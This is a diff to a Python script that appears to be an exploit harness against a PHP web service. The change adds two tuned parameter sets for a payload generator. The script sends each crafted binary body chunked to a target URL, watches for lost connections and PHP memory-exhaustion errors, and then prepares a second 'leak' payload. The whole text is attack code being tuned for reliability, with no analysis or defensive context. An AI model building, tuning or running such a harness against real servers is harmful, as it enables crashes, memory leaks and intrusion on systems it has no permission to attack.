@@ -42,10 +42,15 @@ def hist(dec):
             low[q] += 1
     return total, mod, low
 
-for attempt in (1, 2):
+ARMS = [
+    ("a860", ["--parts", "860", "--depth", "64", "--big", "78"]),
+    ("a4000", ["--parts", "4000", "--depth", "62", "--big", "78"]),
+]
+
+for attempt, (tag, knobs) in enumerate(ARMS, start=1):
     a1 = os.path.join(tempfile.mkdtemp(prefix="rc_"), "a.bin")
     subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"), "--out", a1,
-                    "--big", "78"], check=True, stdout=subprocess.DEVNULL)
+                    "--big", "78"] + knobs, check=True, stdout=subprocess.DEVNULL)
     body = open(a1, "rb").read()
     try:
         st, _h, _b = conn.request(url[3] + m.Q, body, chunked=True)
@@ -56,9 +61,10 @@ for attempt in (1, 2):
             conn.connect()
         except Exception:
             pass
-    print("[*] try%d A1 -> %s" % (attempt, ("HTTP %d %dB" % (st, len(_b))) if st else "conn-lost"))
+    print("[*] try%d(%s) A1 %dB -> %s" % (attempt, tag, len(body),
+          ("HTTP %d %dB" % (st, len(_b))) if st else "conn-lost"))
     if b"Allowed memory size of" in _b:
-        print("[*] try%d A1 in-band fatal" % attempt)
+        print("[*] try%d(%s) A1 in-band fatal" % (attempt, tag))
 
     b1 = os.path.join(tempfile.mkdtemp(prefix="rc_"), "b1.bin")
     subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"), "--out", b1,
